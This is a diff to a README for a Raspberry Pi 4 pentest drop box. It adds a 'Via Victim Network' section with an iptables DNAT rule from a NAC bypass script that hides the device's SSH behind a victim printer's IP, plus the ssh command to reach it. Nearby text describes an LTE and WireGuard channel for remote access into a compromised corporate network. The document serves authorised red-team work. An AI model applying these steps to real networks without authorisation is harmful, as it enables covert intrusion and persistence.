@@ -90,6 +90,21 @@ Once connected to the wifi hotspot, you can access the RPi4's SSH network servic
 
 The RPi4 will have the IP address `192.168.200.1`. Just connect with your favorite SSH client (e.g. MobaXTerm).
 
+#### Via Victim Network
+
+The NAC bypass script will add specific iptables rules to make OpenSSH and Responder work:
+
+````
+# rewrite OpenSSH and map TCP/22 (RPi) to victim NAC device (TCP/50222)
+/sbin/iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 50222 -j DNAT --to-destination 169.254.66.66:22
+````
+
+You can then simply access OpenSSH using the victim network:
+
+````
+ssh <user>@<victim-printer-ip> -p 50222 -i <priv-key>
+````
+
 #### Via LTE + VPN
 
 In case you make use of an LTE connection, you can store your WireGuard client profile at `/etc/wireguard/wg0.conf` and start a VPN connection via `sudo wg-quick up wg0`. Then, the RPi4 will be in the same VPN network as your operators (pentesters, red teamers etc.). This allows remote access into a compromised corporate's network, while using an Out-of-Band (OOB) LTE+Wireguard network channel. The WG VPN is not configured to automatically start. It's up to you to configure this.
